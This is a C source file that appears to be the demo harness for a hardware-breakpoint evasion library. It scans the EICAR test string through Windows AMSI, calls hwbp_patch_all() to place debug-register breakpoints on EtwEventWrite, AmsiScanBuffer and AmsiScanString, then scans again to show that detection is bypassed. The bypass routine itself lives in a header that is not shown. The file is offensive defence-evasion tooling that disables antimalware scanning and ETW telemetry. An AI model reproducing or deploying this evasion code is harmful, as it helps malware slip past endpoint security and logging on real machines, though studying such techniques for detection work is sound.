#include "hwbp_evasion.h"
#include <windows.h>
#include <stdio.h>

/* AMSI types — no amsi.h dependency */
typedef void   *HAMSICONTEXT;
typedef void   *HAMSISESSION;
typedef int     AMSI_RESULT;
#define AMSI_RESULT_CLEAN    0
#define AMSI_RESULT_DETECTED 32768

typedef HRESULT (WINAPI *AmsiInitialize_t)  (LPCWSTR, HAMSICONTEXT *);
typedef HRESULT (WINAPI *AmsiOpenSession_t) (HAMSICONTEXT, HAMSISESSION *);
typedef HRESULT (WINAPI *AmsiScanBuffer_t)  (HAMSICONTEXT, void *, ULONG, LPCWSTR, HAMSISESSION, AMSI_RESULT *);
typedef void    (WINAPI *AmsiCloseSession_t)(HAMSICONTEXT, HAMSISESSION);
typedef void    (WINAPI *AmsiUninitialize_t)(HAMSICONTEXT);

static struct {
    AmsiInitialize_t   Init;
    AmsiOpenSession_t  OpenSession;
    AmsiScanBuffer_t   ScanBuffer;
    AmsiCloseSession_t CloseSession;
    AmsiUninitialize_t Uninit;
} amsi;

static int load_amsi(void)
{
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return 0;
    amsi.Init         = (AmsiInitialize_t)  GetProcAddress(h, "AmsiInitialize");
    amsi.OpenSession  = (AmsiOpenSession_t) GetProcAddress(h, "AmsiOpenSession");
    amsi.ScanBuffer   = (AmsiScanBuffer_t)  GetProcAddress(h, "AmsiScanBuffer");
    amsi.CloseSession = (AmsiCloseSession_t)GetProcAddress(h, "AmsiCloseSession");
    amsi.Uninit       = (AmsiUninitialize_t)GetProcAddress(h, "AmsiUninitialize");
    return amsi.Init && amsi.ScanBuffer;
}

static void test_amsi(const char *label)
{
    HAMSICONTEXT ctx = NULL;
    HAMSISESSION ses = NULL;

    if (FAILED(amsi.Init(L"hwbp-demo", &ctx))) {
        printf("[%s] AmsiInitialize failed\n", label);
        return;
    }
    amsi.OpenSession(ctx, &ses);

    /* EICAR test string — blocked by every AV engine */
    const char eicar[] =
        "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    AMSI_RESULT result = AMSI_RESULT_CLEAN;
    HRESULT hr = amsi.ScanBuffer(ctx, (void *)eicar, (ULONG)(sizeof(eicar) - 1),
                                 L"eicar", ses, &result);

    printf("[%s] hr=0x%08lX  result=%d  detected=%s\n",
           label, (unsigned long)hr, (int)result,
           result >= AMSI_RESULT_DETECTED ? "YES" : "no");

    amsi.CloseSession(ctx, ses);
    amsi.Uninit(ctx);
}

int main(void)
{
    if (!load_amsi()) {
        printf("[!] amsi.dll not available\n");
        return 1;
    }

    printf("[*] without bypass:\n");
    test_amsi("before");

    printf("[*] arming HWBP (ETW + AMSI)...\n");
    hwbp_patch_all();
    printf("[+] armed  Dr0=EtwEventWrite  Dr1=AmsiScanBuffer  Dr2=AmsiScanString\n");

    printf("[*] with bypass:\n");
    test_amsi("after ");

    return 0;
}
